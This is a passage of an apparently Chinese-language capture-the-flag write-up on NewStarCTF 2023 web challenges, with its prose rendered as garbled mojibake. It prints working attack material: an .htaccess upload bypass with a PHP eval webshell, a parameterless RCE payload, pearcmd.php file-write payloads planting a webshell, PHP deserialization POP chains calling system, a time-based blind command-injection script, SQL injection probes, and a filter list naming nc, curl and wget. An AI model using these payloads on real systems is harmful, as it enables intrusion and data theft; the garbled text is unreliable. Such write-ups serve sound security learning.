2023/image-20231014151500441.png) å“Ÿå‘µï¼Œç›´æ¥ä¸Šbpï¼Œç°å°†åç¼€æ”¹ä¸ºjpgä¸Šä¼ æŠ“åŒ…çœ‹çœ‹ ![image-20231014151659479](NewStarCTF 2023/image-20231014151659479.png) å—¯ï¼ŒçŒœæµ‹è¿™é‡Œè¿‡æ»¤äº†æ–‡ä»¶åå¹¶ä¸”è¿˜æ£€æµ‹äº†æ–‡ä»¶å¤´ éšåå°è¯•è¿‡æ·»åŠ GIFå¤´æ— æœï¼Œäºæ˜¯å°è¯•ä¸Šä¼ .htaccessæ–‡ä»¶ï¼Œå‘ç°å¯ä»¥ä¸Šä¼  ![image-20231014152301398](NewStarCTF 2023/image-20231014152301398.png) å¦‚ä¸Šå›¾ï¼Œçº¢è‰²å­—ä½“æ„æ€æ˜¯å°†åˆ«çš„åç¼€åæ–‡ä»¶å†…å®¹è§£æä¸ºphpç¨‹åº AddType application/x-httpd-php .gif éšåçœ‹åˆ°æˆåŠŸä¸Šä¼ ï¼Œé‚£æˆ‘ä»¬ç›´æ¥ä¸Šä¼ flag.gifçœ‹çœ‹ï¼Œä¸è¿‡åœ¨ç¬¬ä¸€æ¬¡ä¸Šä¼ çš„æ—¶å€™å¾—å°†phpæ ‡ç­¾è½¬æ¢ä¸€ä¸‹ï¼Œæ¯•ç«Ÿæ­¤ç½‘ç«™è¿‡æ»¤äº†phpæ ‡ç­¾ï¼Œå¦‚ä¸‹payload &lt;script language=\"php\"&gt;eval($_POST[sb]);&lt;/script&gt; ![image-20231014152954676](NewStarCTF 2023/image-20231014152954676.png) å‘ç°æˆåŠŸä¸Šä¼  æˆ‘ä»¬ç›´æ¥è®¿é—®çœ‹çœ‹ ![image-20231014153137082](NewStarCTF 2023/image-20231014153137082.png) æˆåŠŸä¸Šä¼ ï¼Œå°è¯•èšå‰‘è¿æ¥ ![image-20231014153245515](NewStarCTF 2023/image-20231014153245515.png) ![image-20231014153252173](NewStarCTF 2023/image-20231014153252173.png) æ‰¾åˆ°flag WEEK2|WEB-R!!C!!E!! è¿™é¢˜è€æ‡µé€¼äº†ï¼Œå½“æ—¶æ‰«ç›®å½•æ€»æ˜¯429é”™è¯¯ï¼ˆè¯´æ˜¯è®¿é—®é€Ÿåº¦è¿‡å¿«ï¼‰äºæ˜¯æˆ‘ä»¥ä¸ºä¸èƒ½æ‰«ç›®å½•ï¼Œæå¾—æˆ‘è§£ä¸å‡ºæ¥ï¼Œçœ‹äº†wpå‘ç°ç«Ÿç„¶èƒ½æ‰«ï¼Ÿï¼Ÿï¼Ÿæˆ‘æœäº†å•Šï¼Œäºæ˜¯æˆ‘åˆèµ¶ç´§å¯åŠ¨å»æ‰«äº†ä¸€ä¸‹ã€‚ã€‚ã€‚ä¾æ—§æ˜¯429æˆ‘èƒ¡äº† æ— å¥ˆåªèƒ½ç›´æ¥ä¸Šgithackå·¥å…·çœ‹çœ‹ï¼Œæœç„¶è¿˜æ˜¯æåˆ°äº† ![image-20231015223844532](NewStarCTF 2023/image-20231015223844532.png)\tæŸ¥çœ‹boog1pop.php &lt;?php highlight_file(__FILE__); if (';' === preg_replace('/[^\\W]+\\((?R)?\\)/', '', $_GET['star'])) { if(!preg_match('/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i',$_GET['star'])) { eval($_GET['star']); } } ç¬¬ä¸€ä¸ªæ­£åˆ™å¯¹æäº¤çš„å‚æ•°è¿›è¡Œå¤„ç†ï¼šä»»æ„å­—ç¬¦åŠ ä¸Šå¯é€‰çš„æ‹¬å·ï¼ˆå…è®¸åµŒå¥—ï¼‰æ›´æ¢ä¸ºç©ºï¼Œç„¶ååˆ¤æ–­æ˜¯å¦ç­‰äºåˆ†å·ï¼Œç»“åˆä¸‹é¢çš„ eval å¯ä»¥çŸ¥é“å°±æ˜¯æ— å‚æ•°å‘½ä»¤æ‰§è¡Œã€‚ ç¬¬äºŒä¸ªæ­£åˆ™è¿‡æ»¤äº†ä¸€äº›å¸¸ç”¨çš„ç”¨äºæ— å‚æ•°å‘½ä»¤æ‰§è¡Œçš„ php æ–¹æ³•ï¼Œä½†è¿‡æ»¤ä¸å…¨ï¼Œå¯ä»¥ä½¿ç”¨ç±»ä¼¼åŠŸèƒ½çš„æ–¹æ³•è¿›è¡Œç»•è¿‡ï¼Œæœ€ç»ˆå‘½ä»¤æ‰§è¡Œã€‚ è¿™é‡Œä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡é‡è§PHPæ— å‚æ•°RCEï¼Œæµ…æµ…äº†è§£ä¸€ä¸‹ &lt;?php # @Author: h1xa highlight_file(__FILE__); if(';' === preg_replace('/[^\\W]+\\((?R)?\\)/', '', $_GET['code'])) { eval($_GET['code']); } ?&gt; â€‹ ä¸€èˆ¬æ¥è¯´å½“æˆ‘ä»¬å¯ä»¥æ§åˆ¶æˆ–è‡ªå·±ä¸Šä¼ ä¸€ä¸ªæœ¨é©¬åï¼Œå°±å¯ä»¥è¿›è¡Œä»»æ„å‘½ä»¤æ‰§è¡Œï¼Œä½†åƒä¸Šé¢è¿™æ ·/[^\\W]+\\((?R)?\\)/çš„æ­£åˆ™è¿‡æ»¤æ–¹å¼ï¼Œæˆ‘ä»¬ä¸èƒ½è¾“å…¥ä»»ä½•å‚æ•°ï¼Œè¿™æ ·æƒ³ç»•è¿‡çš„è¯ä¸€ä¸ªå¤§çš„æ€è·¯å°±æ˜¯é€šè¿‡å¥—å¨ƒï¼Œé€šè¿‡è®©ä¸€ä¸ªå‡½æ•°çš„è¿”å›å€¼ä½œä¸ºå¦ä¸€ä¸ªå‡½æ•°çš„å‚æ•°ï¼Œä¹Ÿå°±æ˜¯è¿™æ ·a(b(c()));ï¼Œæœ€ç»ˆè¾¾åˆ°rceçš„æ•ˆæœï¼Œä¸‹é¢åˆ—å‡ ç§ç»•è¿‡æ–¹æ³•ï¼Œè¿™é‡Œå°±ä¸èµ˜è¿°äº†ï¼Œä¹‹åæä¸€ä¸ªä¸“é—¨çš„æ–‡ç« å»è®°å½•ä¸€ä¸‹ï¼Œè¿™é‡Œç›´æ¥æ¬å‡ºç­”æ¡ˆäº† è¿™é‡Œæ˜¯GPTå¯¹ä¸Šè¿°æ­£åˆ™çš„è§£æ ä¸Šè¿°æ­£åˆ™è¡¨è¾¾å¼æ˜¯ `/[^\\W]+\\((?R)?\\)/`ï¼Œè®©æˆ‘ä»¬ä¸€æ­¥ä¸€æ­¥è§£é‡Šå®ƒï¼š 1. `/`ï¼šæ­£åˆ™è¡¨è¾¾å¼çš„èµ·å§‹æ ‡è®°ã€‚ 2. `[^\\W]+`ï¼šè¿™æ˜¯ä¸€ä¸ªå­—ç¬¦ç±»ï¼Œè¡¨ç¤ºåŒ¹é…ä¸€ä¸ªæˆ–å¤šä¸ªéå­—æ¯éæ•°å­—çš„å­—ç¬¦ã€‚`[^\\W]` æ˜¯ `\\w` çš„å¦å®šï¼Œ`\\w` åŒ…æ‹¬å­—æ¯ã€æ•°å­—å’Œä¸‹åˆ’çº¿ï¼Œå› æ­¤ `[^\\W]` åŒ¹é…é™¤å­—æ¯ã€æ•°å­—å’Œä¸‹åˆ’çº¿ä¹‹å¤–çš„ä»»ä½•å­—ç¬¦ã€‚`+` è¡¨ç¤ºåŒ¹é…ä¸€ä¸ªæˆ–å¤šä¸ªè¿™æ ·çš„å­—ç¬¦ã€‚ 3. `\\(`ï¼šåŒ¹é…å·¦æ‹¬å· `(` å­—ç¬¦ã€‚æ‹¬å·é€šå¸¸ç”¨äºå‡½æ•°è°ƒç”¨æˆ–åˆ†ç»„ã€‚ 4. `(?R)?`ï¼šè¿™æ˜¯ä¸€ä¸ªé€’å½’å­æ¨¡å¼ï¼Œ`?` è¡¨ç¤ºå…¶å‰é¢çš„å­æ¨¡å¼ï¼ˆ`(?R)`ï¼‰æ˜¯å¯é€‰çš„ã€‚è¿™æ„å‘³ç€å®ƒå¯ä»¥é›¶æ¬¡æˆ–å¤šæ¬¡é‡å¤æ•´ä¸ªæ¨¡å¼ã€‚ 5. `\\)`ï¼šåŒ¹é…å³æ‹¬å· `)` å­—ç¬¦ã€‚ ç»¼åˆæ¥çœ‹ï¼Œè¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„ç›®çš„æ˜¯åŒ¹é…ä¸€ä¸ªæˆ–å¤šä¸ªéå­—æ¯éæ•°å­—å­—ç¬¦ï¼Œç„¶åç´§æ¥ç€ä¸€ä¸ªå·¦æ‹¬å·ï¼Œä¹‹åæ˜¯å¯é€‰çš„é€’å½’å­æ¨¡å¼ï¼Œæœ€åæ˜¯å³æ‹¬å·ã€‚è¿™çœ‹èµ·æ¥æ˜¯ä¸€ç§è¯•å›¾åŒ¹é…å‡½æ•°è°ƒç”¨çš„æ¨¡å¼ï¼Œä½†å®ƒä½¿ç”¨é€’å½’å­æ¨¡å¼çš„æ–¹å¼å¯èƒ½å¹¶ä¸æ˜¯æœ€å¥½çš„æ–¹å¼æ¥å¤„ç†å‡½æ•°åµŒå¥—ã€‚ ![image-20231015225038371](NewStarCTF 2023/image-20231015225038371.png) ä¼ å…¥ä¸Šè¿°payloadæ‹¿åˆ°flag ?star=eval(pos(array_reverse(getallheaders()))); X-Forwarder-Proto: system('cat /f*'); WEEK3|WEB-Include ğŸ &lt;?php error_reporting(0); if(isset($_GET['file'])) { $file = $_GET['file']; if(preg_match('/flag|log|session|filter|input|data/i', $file)) { die('hacker!'); } include($file.\".php\"); # Something in phpinfo.php! } else { highlight_file(__FILE__); } ?&gt; çœ‹åˆ°ä»£ç ä¹‹åæ„Ÿè§‰ä¼¼æ›¾ç›¸è¯†ï¼Œä½†å´å¿˜è®°äº†ï¼Œä¸è¿‡è¿™é‡Œæç¤ºæˆ‘ä»¬çœ‹ä¸€ä¸‹phpinfo.phpé¡µé¢ï¼Œé‚£æˆ‘ä»¬å°±çœ‹çœ‹ ![image-20231021161355406](NewStarCTF 2023/image-20231021161355406.png) æµè§ˆä¸€æ³¢å‘ç°è¿™é‡Œçš„flagè™½ç„¶æ˜¯é”™çš„ï¼Œä½†å´ä¹Ÿæ˜¯ä¸€ä¸ªhintï¼Œä»–æç¤ºè®©æˆ‘ä»¬æ£€æŸ¥ä¸€ä¸‹register_argc_argvè¿™ä¸ªå˜é‡ï¼Œ ![image-20231021161441682](NewStarCTF 2023/image-20231021161441682.png) å¦‚ä¸Šå›¾æˆ‘ä»¬çœ‹åˆ°è¿™ä¸ªå˜é‡æ˜¯å¼€å¯çš„çŠ¶æ€ï¼Œé‚£åº”è¯¥å°±å¯ä»¥çŒœåˆ°è¿™é‡Œæœ‰æ¼æ´å¯ä»¥åˆ©ç”¨ï¼Œä½†æ¯•ç«Ÿæˆ‘ä¹Ÿæ˜¯èœé¸¡æ²¡å­¦è¿‡ï¼Œé‚£è¿™æ—¶å€™å°±éœ€è¦å¼ºå¤§çš„æœç´¢å¼•æ“äº†ï¼Œgoogleæœç´¢å…³é”®è¯ï¼šæ–‡ä»¶åŒ…å«æ¼æ´ register_argc_argv=onï¼›æˆ‘ä»¬å°±å¯ä»¥çœ‹åˆ°æœ‰å¾ˆå¤šæ¼æ´å¤ç°çš„æ–‡ç« ï¼Œæˆ‘ä»¬æŒ‘ä¸€ä¸ªæ¯”è¾ƒå¥½çš„å¤ç°å³å¯ ![image-20231021161617671](NewStarCTF 2023/image-20231021161617671.png) è¿™é‡Œå‘¢æˆ‘å°±å…ˆå¤ç°ä¸€æ³¢ï¼Œè‡³äºåŸç†å°±å¦èµ·æ–‡ç« å»å­¦ä¹ å§ã€‚ é¦–å…ˆè¿™ä¸ªæ¼æ´å«åšpearcmd.phpæ¼æ´ è¦åˆ©ç”¨è¿™ä¸ªpearcmd.phpéœ€è¦æ»¡è¶³å‡ ä¸ªæ¡ä»¶ï¼š ï¼ˆ1ï¼‰.è¦å¼€å¯register_argc_argvè¿™ä¸ªé€‰é¡¹åœ¨Dockerä¸­æ˜¯è‡ªåŠ¨å¼€å¯çš„ ï¼ˆ2ï¼‰.è¦æœ‰æ–‡ä»¶åŒ…å«çš„åˆ©ç”¨ ![image-20231021161911834](NewStarCTF 2023/image-20231021161911834.png) è¿™é‡Œå€Ÿç”¨ç°æˆçš„å›¾ç‰‡æˆªå›¾äº† çœ‹åˆ°config-createï¼Œå»é˜…è¯»å…¶ä»£ç å’Œå¸®åŠ©ï¼Œå¯ä»¥çŸ¥é“ï¼Œè¿™ä¸ªå‘½ä»¤éœ€è¦ä¼ å…¥ä¸¤ä¸ªå‚æ•°ï¼Œå…¶ä¸­ç¬¬äºŒä¸ªå‚æ•°æ˜¯å†™å…¥çš„æ–‡ä»¶è·¯å¾„ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¼šè¢«å†™å…¥åˆ°è¿™ä¸ªæ–‡ä»¶ä¸­ã€‚ æ‰€ä»¥æœ€åæ„é€ å‡ºpayloadï¼š /index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=phpinfo()?&gt;+/tmp/hello.php ä¸Šé¢æ˜¯å°†å†™åˆ°/tmp/hello.php,ç„¶åæˆ‘ä»¬å†ä½¿ç”¨æ–‡ä»¶åŒ…å«è¿›è¡ŒåŒ…å«æˆ‘ä»¬ä¹‹å‰å†™å…¥çš„æ–‡ä»¶ï¼ˆhello.phpï¼‰å°±å¯ä»¥äº†ã€‚ è€Œå¯¹äºæ­¤é¢˜æˆ‘ä»¬éœ€è¦æ„é€ å¦‚ä¸‹payloadï¼š /index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?php @eval($_POST[1]);?&gt;+/tmp/hello.php è¿™é‡Œå‘¢ç›´æ¥ç”¨bpä¼ å…¥ï¼Œç”¨hackbarä¼ å…¥çš„è¯ä¼šè¢«urlç¼–ç ï¼Œå¯¼è‡´ä¼ å…¥æ–‡ä»¶æ— æ³•è§£æ ![image-20231021163148135](NewStarCTF 2023/image-20231021163148135.png) ä½†è¿™é‡Œçš„index.phpä¹Ÿæ˜¯å¯ä»¥å»æ‰çš„ ![image-20231021174341649](NewStarCTF 2023/image-20231021174341649.png) å¦‚ä¸Šå›¾ï¼Œè¿™ä»£è¡¨æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬è®¿é—®åå°æ–‡ä»¶ï¼Œæˆ‘ä»¬åˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´è¯»å– ![image-20231021174637310](NewStarCTF 2023/image-20231021174637310.png) å¦‚ä¸Šå›¾ä»£è¡¨ä¸Šä¼ æˆåŠŸï¼Œæ¥ä¸‹æ¥å¯ä»¥èšå‰‘è¿æ¥æˆ–è€…ç›´æ¥æ‰‹åŠ¨è¯»å–ï¼Œè¿™é‡Œæˆ‘å°±ç›´æ¥ä¸Šäº†ï¼š1=system('cat /flag'); ![image-20231021174758295](NewStarCTF 2023/image-20231021174758295.png) æ‹¿åˆ°flag WEEK3|WEB-POP Gadget &lt;?php highlight_file(__FILE__); class Begin{ public $name; public function __destruct() { if(preg_match(\"/[a-zA-Z0-9]/\",$this-&gt;name)){ echo \"Hello\"; }else{ echo \"Welcome to NewStarCTF 2023!\"; } } } class Then{ private $func; public function __toString() { ($this-&gt;func)(); return \"Good Job!\"; } } class Handle{ protected $obj; public function __call($func, $vars) { $this-&gt;obj-&gt;end(); } } class Super{ protected $obj; public function __invoke() { $this-&gt;obj-&gt;getStr(); } public function end() { die(\"==GAME OVER==\"); } } class CTF{ public $handle; public function end() { unset($this-&gt;handle-&gt;log); } } class WhiteGod{ public $func; public $var; public function __unset($var) { ($this-&gt;func)($this-&gt;var); } } @unserialize($_POST['pop']); ç®€å•çš„ååºåˆ—åŒ–ï¼Œæˆ‘ä»¬ä¾æ—§è€æ€è·¯ï¼Œçœ‹æ•æ„Ÿå‡½æ•°ï¼Œæµè§ˆä¸€ä¸‹å¯ä»¥æ¸…æ™°çœ‹åˆ°whiteGodç±»ä¸­æœ‰ä¸€å¤„($this-&gt;func)($this-&gt;var);ï¼Œè¿™é‡Œå¾ˆæ˜æ˜¾å°±æ˜¯å¯ä»¥è®©æˆ‘ä»¬è‡ªå®šä¹‰å‡½æ•°çš„æ¼æ´ç‚¹ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬çœ‹å…¶æ‰€åœ¨unsetæ–¹æ³•ã€‚æƒ³ä¸€ä¸‹å¦‚ä½•è°ƒç”¨å³å¯ __unset()ï¼Œå½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨unset()æ—¶ï¼Œ__unset()ä¼šè¢«è°ƒç”¨ ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬è¦æƒ³åŠæ³•åœ¨unsetå‡½æ•°çš„å‚æ•°ä¸­ï¼Œè®¿é—®ä¸€ä¸ªä¸å¯è®¿é—®çš„å±æ€§ï¼ˆä¹Ÿå°±æ˜¯ä¸å­˜åœ¨çš„ï¼‰éšåæˆ‘ä»¬å†æµè§ˆä¸€ä¸‹çœ‹åˆ°è¿™é‡Œunset($this-&gt;handle-&gt;log);å¾ˆæ˜æ˜¾è¿™å°±æ˜¯æˆ‘ä»¬è¦çš„ç‚¹ï¼Œé‚£æˆ‘ä»¬åœ¨åˆ†æå¦‚ä½•è°ƒç”¨å…¶æ‰€åœ¨çš„endå‡½æ•°ã€‚ å†æ¬¡æµè§ˆä¼šå‘ç°Handleç±»ä¸­çš„callæ–¹æ³•å…¶ä¸­ä¼šè°ƒç”¨endå‡½æ•°ï¼Œé‚£æˆ‘ä»¬å†æ‰¾å¦‚ä½•è°ƒç”¨callé­”æœ¯æ–¹æ³• __call()ï¼Œåœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è°ƒç”¨ æ ¹æ®ä¸Šè¿°æ¡ä»¶æˆ‘ä»¬å¯ä»¥å‘ç°åœ¨Superç±»ä¸­æœ‰ä¸€å¤„$this-&gt;obj-&gt;getStr();ï¼Œå¾ˆæ˜æ˜¾å°±æ˜¯æˆ‘ä»¬è¦çš„ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬åœ¨çœ‹å¦‚ä½•è°ƒç”¨å…¶æ‰€åœ¨invokeé­”æœ¯æ–¹æ³• __invoke()ï¼Œå½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œ__invoke()æ–¹æ³•ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ è¿™é‡Œå¾ˆæ˜æ˜¾åœ¨Thenç±»ä¸­çš„($this-&gt;func)();å°±æ˜¯æˆ‘ä»¬æƒ³è¦çš„ï¼Œæ¥ä¸‹æ¥åœ¨æ€è€ƒå¦‚ä½•è°ƒç”¨å…¶æ‰€åœ¨tostringæ–¹æ³• __toString()ï¼Œç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶çš„å›åº”æ–¹æ³• å¾ˆæ˜æ˜¾ä¸Šè¿°ä»£ç ä¸­çš„æ­£åˆ™è¡¨è¾¾å¼å°±æ˜¯æˆ‘ä»¬è¦çš„ï¼Œåœ¨æ­¤è¡¨è¾¾å¼ä¸­nameå˜é‡æ˜¯ä¼šè¢«å½“åšå­—ç¬¦ä¸²å»æ£€æŸ¥æ˜¯å¦åŒ¹é…æ­£åˆ™çš„ï¼Œè€Œdestructå‡½æ•°ä¼šåœ¨å¯¹è±¡ç”Ÿå‘½å‘¨æœŸç»“æŸçš„æ—¶å€™è‡ªåŠ¨è°ƒç”¨ã€‚æ ¹æ®ä»¥ä¸Šæˆ‘ä»¬æœ‰å¦‚ä¸‹popé“¾ begin-&gt;Then-&gt;Super-&gt;Handle-&gt;CTF-&gt;WhiteGodã€‚å¦‚ä¸‹ &lt;?php class Begin{ public $name; } class Then{ public $func; } class Handle{ public $obj; } class Super{ public $obj; } class CTF{ public $handle; } class WhiteGod{ public $func; public $var; } $poc = new Begin(); $poc-&gt;name = new Then(); $poc-&gt;name-&gt;func = new Super(); $poc-&gt;name-&gt;func-&gt;obj = new Handle(); $poc-&gt;name-&gt;func-&gt;obj-&gt;obj = new CTF(); $poc-&gt;name-&gt;func-&gt;obj-&gt;obj-&gt;handle = new WhiteGod(); $poc-&gt;name-&gt;func-&gt;obj-&gt;obj-&gt;handle-&gt;func = 'system'; $poc-&gt;name-&gt;func-&gt;obj-&gt;obj-&gt;handle-&gt;var = 'cat /flag'; echo urlencode(serialize($poc)); ?&gt; è¿™é‡Œæ³¨æ„($this-&gt;func)($this-&gt;var);æˆ‘ä»¬å¦‚æœæƒ³è¦æŸ¥çœ‹æ ¹ç›®å½•å°±éœ€è¦system(â€˜ls /â€™)ï¼Œä½†åœ¨å¦‚ä¸Špopé“¾ä¸­æ˜¯æ— æ³•èµ‹å€¼ä½¿ls /ä¸¤è¾¹çš„å•å¼•å·æ­£å¸¸æ˜¾ç¤ºçš„ï¼Œè¿™é‡Œæµ‹è¯•ä¸€ç•ªå‘ç°ls /ä¸¤è¾¹å¿…é¡»å¾—å«æœ‰å•å¼•å·æˆ–è€…åŒå¼•å·æ‰è¡Œï¼Œä½†å¦‚æœ\"'ls /'\";è¿™æ ·èµ‹å€¼ä¹Ÿæ˜¯è¡Œä¸é€šçš„ï¼Œè¿™é‡Œæˆ‘ä¹Ÿæ²¡å’‹æ‡‚æ˜¯ä¸ºä»€ä¹ˆï¼Œåªæœ‰çœ‹wpæ¥è§£æƒ‘äº†ï¼Œä½†æ˜¯æˆ‘ä»¬èµ‹å€¼ls${IFS}/å°±å¯ä»¥æ­£å¸¸æ˜¾ç¤º ![image-20231022093318823](NewStarCTF 2023/image-20231022093318823.png) ä¹‹åå°†varèµ‹å€¼ä¸ºcat /flagå³å¯ ![image-20231022093355514](NewStarCTF 2023/image-20231022093355514.png) æ‹¿åˆ° flag WEEK3|WEB-R!!!C!!!E!!! &lt;?php highlight_file(__FILE__); class minipop{ public $code; public $qwejaskdjnlka; public function __toString() { if(!preg_match('/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&amp;|\\*|\\?|\\{|\\}|\\&gt;|\\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $this-&gt;code)){ exec($this-&gt;code); } return \"alright\"; } public function __destruct() { echo $this-&gt;qwejaskdjnlka; } } if(isset($_POST['payload'])){ //wanna try? unserialize($_POST['payload']); } è¿™é“é¢˜ç›®çš„ååºåˆ—åŒ–ç‚¹å¾ˆç®€å•ï¼Œé‡ç‚¹å°±æ˜¯RCEçš„æ—¶å€™é‡‡ç”¨çš„execå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°åœ¨è¾“å…¥å‘½ä»¤ä¹‹åæ˜¯ä¸ä¼šå›æ˜¾æœ€ç»ˆç»“æœçš„ï¼Œå› æ­¤è€ƒå¯Ÿæˆ‘ä»¬å¯¹æ— å›æ˜¾RCEçš„æŒæ¡ã€‚ ä¹‹å‰ä¸ä¼šè¿™ä¸ªçŸ¥è¯†ç‚¹ï¼Œå­¦ä¹ äº†ä¸€æ³¢å†æ¥çœ‹è¿™ä¸ªå‘ç°è¿˜æ˜¯ä¸èƒ½å®Œå…¨æŒæ¡ã€‚ æ­£å¸¸æƒ…å†µæˆ‘ä»¬å¯ä»¥é€šè¿‡åå¼¹shellã€å¤–å¸¦æ•°æ®ã€curlè¯·æ±‚ï¼Œç­‰æ–¹æ³•ï¼Œä½†è¿™é‡Œå¯ä»¥å‘ç°è¿‡æ»¤å¾ˆå…¨ä»¥ä¸Šæƒ…å†µéƒ½ä¸èƒ½ä½¿ç”¨ï¼Œä¹‹åçœ‹äº†wpå‘ç°æœ‰ä¸¤ç§æ–¹æ³•ï¼Œä¸€ä¸ªæ˜¯éé¢„æœŸ æ–¹æ³•ä¸€ï¼šlsç›´æ¥å†™å…¥è¯»å– è¿™é‡Œå‘¢å®˜æ–¹ä¹Ÿè¯´äº†æ˜¯ç”±äºæƒé™æ²¡ç»™æ­»ï¼Œå¯¼è‡´æˆ‘ä»¬å¯ä»¥ç”¨lså†™å…¥æ ¹ç›®å½•å»è¯»å–payloadå¦‚ä¸‹ï¼š &lt;?php highlight_file(__FILE__); class minipop{ public $code; public $qwejaskdjnlka; } $poc = new minipop(); $poc-&gt;qwejaskdjnlka = new minipop(); $poc-&gt;qwejaskdjnlka-&gt;code = \"ls / | t''ee 2\"; echo serialize($poc); ?&gt; è¿™é‡Œæ˜¯å°†ls /è¾“å‡ºçš„ç»“æœé€šè¿‡teeå†™å…¥åˆ°2ä¸­ï¼Œä¹‹åæˆ‘ä»¬ç›´æ¥urlæ‹¼æ¥2å³å¯è¯»å–åˆ°å†…å®¹ ![image-20231029095629112](NewStarCTF 2023/image-20231029095629112.png)æ‰¾åˆ°flagè·¯å¾„ï¼Œé‚£æˆ‘ä»¬ç›´æ¥è¯»å– &lt;?php highlight_file(__FILE__); class minipop{ public $code; public $qwejaskdjnlka; } $poc = new minipop(); $poc-&gt;qwejaskdjnlka = new minipop(); $poc-&gt;qwejaskdjnlka-&gt;code = \"cat /flag_is_h3eeere | t''ee 2\"; echo serialize($poc); ?&gt; ![image-20231029095757158](NewStarCTF 2023/image-20231029095757158.png) æ‹¿åˆ°flag æ–¹æ³•äºŒï¼šbashç›²æ³¨ è¿™é‡Œé¢„æœŸè§£åº”è¯¥æ˜¯bashç›²æ³¨çš„ï¼Œä¹Ÿå°±æ˜¯åœ¨æ¯æ¬¡ä½¿ç”¨å‘½ä»¤åä½¿ç”¨cutç­‰å‡½æ•°æˆªä¸€ä¸‹å­—ç¬¦ä¸²çš„æŸä¸€ä½è¿›è¡Œåˆ¤æ–­ï¼Œè¿™é‡Œå®˜æ–¹wpç»™äº†ä¸ªè„šæœ¬ï¼Œä½†æ˜¯è¿è¡Œèµ·æ¥å¾ˆè´¹åŠ²å•Šï¼Œå‡ºé”™ç‡å¾ˆé«˜ï¼Œä¼¼ä¹å¾—è¿è¡Œå¥½å‡ æ¬¡æ‰æœ‰å¯èƒ½å¾—åˆ°flag import time import requests url = \"http://152fe0ae-26ba-4e15-a358-96dc061a2152.node4.buuoj.cn:81/\" result = \"\" for i in range(1,15): for j in range(1,50): #asciiç è¡¨ for k in range(32,127): k=chr(k) payload =f\"if [ `cat /flag_is_h3eeere | awk NR=={i} | cut -c {j}` == '{k}' ];then sleep 2;fi\" length=len(payload) payload2 ={ \"payload\": 'O:7:\"minipop\":2:{{s:4:\"code\";N;s:13:\"qwejaskdjnlka\";O:7:\"minipop\":2:{{s:4:\"code\";s:{0}:\"{1}\";s:13:\"qwejaskdjnlka\";N;}}}}'.format( length, payload) } t1=time.time() r=requests.post(url=url,data=payload2) t2=time.time() if t2-t1 &gt;1.5: result+=k print(result) result += \" \" ç”±äºå’±ä¹Ÿä¸ä¼špyè„šæœ¬ï¼Œä¹Ÿä¸çŸ¥é“å¦‚ä½•æ”¹è¿›ã€‚ã€‚ã€‚ã€‚ WEEK3|WEB-medium_sql ![image-20231029104228759](NewStarCTF 2023/image-20231029104228759.png) ä¾æ—§æ˜¯sqlæ³¨å…¥ä¸è¿‡å¯æƒ³è€ŒçŸ¥è¿™é‡Œè¿‡æ»¤è‚¯å®šæ›´å¤šï¼Œå½“æ—¶åšçš„æ—¶å€™ä¹Ÿæ˜¯æ²¡åšå‡ºæ¥ï¼Œæ¯•ç«Ÿæ˜¯èœé¸¡ã€‚çœ‹äº†wpå‘ç°ï¼Œè¿˜æ˜¯è¦å†™pyè„šæœ¬ï¼ˆå½“æ—¶æˆ‘ä¹Ÿåªæ˜¯åˆ¤æ–­å‡ºæ¥æ˜¯å¯ä»¥è¿›è¡ŒæŠ¥é”™æ³¨å…¥ï¼Œä¸è¿‡æŠ¥é”™æ³¨å…¥æ²¡æœ‰æŠ¥é”™å›æ˜¾ï¼‰è€Œå½“æ—¶ä¹Ÿä¸ä¼šå†™å…³äºç›²æ³¨è„šæœ¬ï¼Œäºæ˜¯å°±æ”¾å¼ƒäº†ã€‚ä»Šå¤©å­¦ä¸€ä¸‹å¦‚ä½•å†™ åœ¨week1çš„åŸºç¡€ä¸Šï¼Œå¤šè¿‡æ»¤äº†unionã€‚ IFå‡½æ•°ç”¨æ³•ï¼š IFå‡½æ•°æ ¹æ®åˆ¤æ–­æ¡ä»¶æ˜¯å¦æˆç«‹è¿›è¡Œé€‰æ‹©æ‰§è¡Œï¼Œæˆç«‹æ—¶æ‰§è¡Œä¸€æ¡è¯­å¥ï¼Œä¸æˆç«‹æ—¶æ‰§è¡Œå¦ä¸€æ¡è¯­å¥ è¯­æ³•ç»“æ„ IF(condition, value_if_true, value_if_false) å‚æ•°è¯´æ˜ condition: åˆ¤æ–­æ¡ä»¶ value_if_true: å¦‚æœconditionçš„ç»“æœä¸ºTRUEï¼Œè¿”å›è¯¥å€¼ value_if_false: å¦‚æœconditionçš„ç»“æœä¸ºFALSEï¼Œè¿”å›è¯¥å€¼ éªŒè¯å­˜åœ¨å¸ƒå°”ç›²æ³¨ï¼š ?id=TMP0919' And if(1&gt;0,1,0)# ?id=TMP0919' And if(0&gt;1,1,0)# ä¸Šé¢æ˜¯å®˜æ–¹wpç»™å‡ºçš„åˆ¤æ–­ï¼Œè¿™é‡Œæˆ‘å¤ç°ç¼ºä¸æˆåŠŸï¼Œä¹‹åæˆ‘æ¢æˆäº†â€“+æ³¨é‡Šä¾¿æˆåŠŸäº† ![image-20231029105300325](NewStarCTF 2023/image-20231029105300325.png) 